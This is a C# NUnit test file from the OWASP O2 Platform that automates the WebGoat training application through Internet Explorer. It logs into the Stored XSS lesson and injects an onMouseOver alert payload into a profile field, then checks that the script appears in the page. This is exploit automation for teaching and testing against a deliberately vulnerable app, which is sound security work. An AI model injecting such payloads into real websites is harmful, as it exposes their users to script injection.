// This file is part of the OWASP O2 Platform (http://www.owasp.org/index.php/OWASP_O2_Platform) and is released under the Apache 2.0 License (http://www.apache.org/licenses/LICENSE-2.0)
using System;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using O2.Interfaces.O2Core;
using O2.Kernel;
using O2.Kernel.ExtensionMethods;
using O2.DotNetWrappers.ExtensionMethods;
using SHDocVw;
using WatiN.Core; 
using O2.XRules.Database.APIs;
using O2.Views.ASCX.ExtensionMethods;
using O2.Views.ASCX.classes.MainGUI;
using O2.External.SharpDevelop.ExtensionMethods;

using NUnit.Framework;


//O2File:API_WebGoat.cs

//O2Ref:Interop.SHDocVw.dll
//O2Ref:WatiN.Core.1x.dll
//O2File:DotNet_ViewState.cs
//O2Ref:Microsoft.mshtml.dll
//O2Ref:NUnit.Framework.dll

namespace O2.XRules.Database.WebGoat
{	
	[TestFixture]
    public partial class WebGoat_BlackBox_Exploits
    {   
    	//properties for dependency injection
    	private string StartUrl { get; set; }
    	private Control GuiControl {get; set;}    	
    	
    	//internal vars
    	private string pathToWebGoatInstallation = @"C:\O2\DemoData\WebGoat\WebGoat-5.3_RC1";
    	private WatiN_IE ie;
    	private API_WebGoat webGoat;
    	
    	public static bool LocalCopyAvailable = false;
    	
    	public  WebGoat_BlackBox_Exploits()
    	{
    	}
    	
    	public  WebGoat_BlackBox_Exploits(Control guiControl, string startUrl)
    	{
    		GuiControl = guiControl;
    		StartUrl = startUrl;    		
    	}
    	
    	public static void launchGui()
    	{
    		launchExploitExecutionEnvironemnt();
    	}    	
    	
    	
    	[Test]
    	public string Download_Latest_Version()
    	{       		    		
    		setup();    		
    		webGoat.download();     		
    		return "ok";
    	}
    	
    	[Test]
    	public string Start_Local_Copy()
    	{    		    		
    		setup();        		
    		webGoat.start();     		    		
    		return "ok";
    	}
    	
    	[Test]
    	public string Open_Main_Page()
    	{    		
    		setup();
    		webGoat.openMainPage(); 
    		var pageHtml = ie.html();
    		Assert.That(pageHtml.contains("WebGoat"),"Could not find the word WebGoat in the default page");
    		if (ie.hasButton("Start WebGoat"))
    		{
    			webGoat.openMainPage(); 
    			ie.button("Start WebGoat").flash().click();
    			Assert.That(pageHtml.contains("WebGoat"),"Could not find the word WebGoat in the default page");    			
    		}
    		LocalCopyAvailable = true;    		
    		return "ok";
    	}
    	
    	[Test]
    	public string Exploit_Stage_1_Stored_XSS_OK()
    	{    	     		
    		Assert.That(LocalCopyAvailable, "Open_Main_Page test was not sucessfully executed" );
    		return Exploit_Stage_1_Stored_XSS("address1");
		}
		
		[Test]
		public string Exploit_Stage_1_Stored_XSS_Fail()
		{
			return Exploit_Stage_1_Stored_XSS("description");
		}
				
		private string Exploit_Stage_1_Stored_XSS(string fieldToInsertPayload)
		{
			setup();
			var payload = "<a href=\"\" onMouseOver=\"javascript:alert('xss')\">Over me to see xss</a>";
			webGoat.openMainPage(); 
			//ie.disableFlashing();  
			ie.link("Cross-Site Scripting (XSS)").flash().click();
			ie.link("LAB: Cross Site Scripting").flash().click();			
			ie.link("Stage 1: Stored XSS").flash();
			ie.field("password").flash().value("larry");
			ie.button("Login").flash().click();
			ie.selectLists()[1].options()[0].select().flash();
			ie.button("ViewProfile").flash().click();
			ie.button("EditProfile").flash().click(); 			
			ie.field(fieldToInsertPayload).value(payload).flash();			
			ie.button("UpdateProfile").flash().click(); 			
			Assert.That(ie.html().contains("onmouseover=\"javascript:alert('xss')\""), "Payload was not inserted into page");
			return "ok";
		}
		
		[Test]
		public string Stage_1_Stored_XSS_Restart_Lesson()
		{
			setup();			
			webGoat.openMainPage(); 
			//ie.disableFlashing();  
			ie.link("Cross-Site Scripting (XSS)").flash().click();
			ie.link("LAB: Cross Site Scripting").flash().click();			
			ie.link("Stage 1: Stored XSS").flash().click();
			ie.link("Restart this Lesson").flash().click();
			return "ok";
		}
		
    }
    
    
    public partial class WebGoat_BlackBox_Exploits
	{
		public static void launchExploitExecutionEnvironemnt()
		{
			var h2Script = "BlackBox - Exploit Execution.h2".local();
			var topPanel = (Control)h2Script.executeH2Script();				
			topPanel.width(800)
					.height(600)
					.top(0)
					.left(0);
			var formControls = topPanel.controls(true); 
			formControls.controls<TextBox>()[0].sendKeys("WebGoat_BlackBox_Exploits.cs".local().line());
			//formControls.controls<LinkLabel>()[2].click();
			//show.info(formControls.controls<LinkLabel>());	
		}
		
		private void setup()
    	{
    		if (GuiControl.notNull())    		
    		{
    			GuiControl.clear();    	   		    		
    			ie = GuiControl.add_IE();
    			ie.silent(true);
    		}
    		else
    		{
    			var panel = O2Gui.open<Panel>("WebGoat BlackBox Exploits - Execution window", 800,600);
				ie = panel.add_IE();
				panel.parentForm()
				  .top(0)
				  .left(0);
    		}
			
    		webGoat = new API_WebGoat(ie, pathToWebGoatInstallation);    		    		    			
    	}
	}

}   